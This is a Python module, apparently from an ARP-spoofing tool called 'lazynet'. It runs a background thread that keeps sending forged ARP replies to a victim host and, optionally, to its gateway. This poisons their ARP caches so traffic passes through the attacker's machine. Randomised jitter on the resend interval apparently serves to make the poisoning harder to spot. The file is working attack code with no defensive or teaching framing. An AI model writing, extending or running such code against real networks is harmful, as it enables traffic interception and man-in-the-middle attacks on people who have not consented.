"""Background thread that keeps the victim's ARP cache poisoned"""

import logging
import random
import threading

from ..shared.constants import DEFAULT_POISON_INTERVAL, JITTER_FRACTION
from .helpers import send_arp_reply


logger = logging.getLogger("lazynet")


class PoisonScheduler(threading.Thread):
    """ Continuously resend forged ARP replies """

    def __init__(self, target, gateway, attacker_mac, interface, direction="two-way", interval=DEFAULT_POISON_INTERVAL, verbose=True):
        threading.Thread.__init__(self)
        self.daemon = True
        self.name = "arp-poison-scheduler"

        self.target = target
        self.gateway = gateway
        self.attacker_mac = attacker_mac
        self.interface = interface
        self.direction = direction
        self.interval = interval
        self.verbose = verbose

        self.stop_event = threading.Event()

    def run(self):
        if self.verbose:
            logger.info(f"PoisonScheduler started (direction={self.direction}, interval={self.interval:.2f}s)")
        while not self.stop_event.is_set():
            self.send_burst()
            self.stop_event.wait(self.compute_delay())

    def stop(self):
        self.stop_event.set()
        self.join(timeout=2.0)

    def send_burst(self):
        send_arp_reply(
            target_ip=self.target.ip,
            target_mac=self.target.mac,
            spoof_ip=self.gateway.ip,
            attacker_mac=self.attacker_mac,
            interface=self.interface,
        )

        if self.direction == "two-way":
            send_arp_reply(
                target_ip=self.gateway.ip,
                target_mac=self.gateway.mac,
                spoof_ip=self.target.ip,
                attacker_mac=self.attacker_mac,
                interface=self.interface,
            )

    def compute_delay(self):
        """Return the next wait time with random jitter applied"""
        jitter = random.uniform(-JITTER_FRACTION, JITTER_FRACTION) # JITTER_FRACTION is set in the constants file 
        delay = self.interval * (1.0 + jitter)
        if delay < 0.1:
            delay = 0.1
        return delay